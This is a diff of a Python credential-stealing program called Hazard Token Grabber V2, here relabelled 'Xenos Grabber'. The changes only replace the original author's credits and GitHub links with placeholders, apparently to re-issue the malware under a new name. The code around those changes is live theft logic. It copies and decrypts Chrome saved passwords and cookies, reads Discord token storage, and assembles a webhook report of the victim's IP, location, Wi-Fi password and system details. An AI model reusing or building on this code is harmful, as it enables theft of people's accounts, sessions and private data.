@@ -113,7 +113,7 @@ class Hazard_Token_Grabber_V2:
     def grabPassword(self):
         master_key = self.get_master_key()
         f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+        f.write("Made by #### | https://github.com/#####\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
             shutil.copy2(login_db, "Loginvault.db")
@@ -143,7 +143,7 @@ class Hazard_Token_Grabber_V2:
     def grabCookies(self):
         master_key = self.get_master_key()
         f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+        f.write("Made by #### | https://github.com/#####\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
@@ -172,7 +172,7 @@ class Hazard_Token_Grabber_V2:
 
     def grabTokens(self):
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+        f.write("Made by #### | https://github.com/####\n\n")
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
@@ -301,7 +301,7 @@ class Hazard_Token_Grabber_V2:
                 {
                     "author": {
                         "name": "Xenos Grabber",
-                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
+                        "url": "https://github.com/#####",
                         "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
                     },
                     "description": f"**XENOS WAS RAN**\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```\n[Google Maps Location]({googlemap})\n```fix\nnetwork:   {getwifinetwork}\npassword:{getwifipassword}```\nSYSTEM INFO```{sysinfo}```",
